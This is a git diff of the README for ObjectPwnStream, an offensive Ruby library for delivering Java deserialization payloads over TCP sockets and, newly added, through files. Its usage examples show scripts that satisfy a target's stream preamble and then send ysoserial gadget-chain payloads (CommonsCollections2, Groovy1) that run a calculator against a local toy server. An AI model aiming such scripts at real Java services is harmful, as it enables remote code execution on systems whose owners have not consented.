@@ -1,6 +1,10 @@
 # ObjectPwnStream
 
-a Ruby implementation of Java's `ObjectInputStream` and `ObjectOutputStream`, to ease the process of Java deserialization exploitation on custom TCP based network protocols.
+a Ruby implementation of Java's `ObjectInputStream` and `ObjectOutputStream`, to ease the process of Java deserialization exploitation.
+
+the library is currently able to deliver the serialized payloads to TCP connections (`tcpSocket.getInputStream()`) and files (`FileInputStream()`).
+## Requirements
+- Ruby v3.0.0 or newer
 
 ## Installation
 
@@ -23,10 +27,11 @@ Or install it from main branch:
     $ git clone https://github.com/hakivvi/ObjectPwnStream
     $ cd ObjectPwnStream
     $ bundle install && bundle exec rake install
+
 ## Usage
 the library provides a set of methods to mimic the methods of both `ObjectInputStream` and `ObjectOutputStream`,
 
-the `readObject()` method is not always the first function run on a TCP socket, so you can't just feed the server with your serialized payload or else `java.io.StreamCorruptedException` will be thrown by the server.
+the `readObject()` method is not always the first function run on a `Socket` or a `FileInputStream`, so you can't just feed the server with your serialized payload or else `java.io.StreamCorruptedException` will be thrown by the server.
 
 take this [test server](https://github.com/hakivvi/ObjectPwnStream/blob/main/spec/test/ToyServer.java) for example, which does read and write a bunch of types before actually calling `readObject()` which the attacker is usually interested in:
 ```java
@@ -76,20 +81,42 @@ using `ObjectPwnStream` library, we can do just that:
 ```ruby
 require 'ObjectPwnStream'
 
-pwnStream = ObjectPwnStream::PwnStream.new("127.0.0.1", 9090)
+pwnStream = ObjectPwnStream::PwnStream.new(host: "127.0.0.1", port: 9090)
 pwnStream.connect!
 pwnStream.open_streams!
 pwnStream.read_int
-pwnStream.write_int 0x1337
+pwnStream.write_int(0x1337)
 pwnStream.read_utf
 pwnStream.write_utf "ObjectPwnStream"
 pwnStream.read_short
-pwnStream.write_short 0xabcd
-pwnStream.read_long signed=true
-pwnStream.write_long -12345
+pwnStream.write_short(0xabcd)
+pwnStream.read_long(signed: true)
+pwnStream.write_long(-12345)
 pwnStream.read_object
 pwnStream.ysoserial_generate!("./ysoserial.jar","CommonsCollections2", "gnome-calculator", encode: true, windows: false)
 pwnStream.write_object(ysoserial: true)
+```
+or as a [`FileInputStream`](https://github.com/hakivvi/ObjectPwnStream/blob/main/spec/test/ToyServerFileMode.java):
+```java
+        ObjectInputStream fis = new ObjectInputStream(new FileInputStream("/tmp/to_deserialize_file"));
+
+        System.out.printf("got a long from the file: %d\n", fis.readLong());
+        try {
+            fis.readObject();
+        } catch(Throwable e){}
+        System.out.println("readObject(): done.");
+```
+to successfully reach `readObject()`, we should provide a valid `long` type first, the [script](https://github.com/hakivvi/ObjectPwnStream/blob/main/spec/test/test_file_mode.rb) will be:
+```ruby
+require 'ObjectPwnStream'
+
+pwnStream = ObjectPwnStream::PwnStream.new(file_path: "/tmp/to_deserialize_file")
+pwnStream.connect!
+pwnStream.open_output_stream!
+pwnStream.write_long(12345)
+pwnStream.ysoserial_generate!("../ysoserial.jar", "Groovy1", "gnome-calculator", encode: true, windows: false)
+pwnStream.write_object(ysoserial: true)
+pwnStream.close!
 ```
 ## PoC
 
@@ -112,5 +139,5 @@ Everyone interacting in the ObjectPwnStream project’s codebases, issue tracker
 
 ## Todo
 
-- document all the functions.
-- support CLI mode.
+- [ ] document all the functions.
+- [ ] support CLI mode.
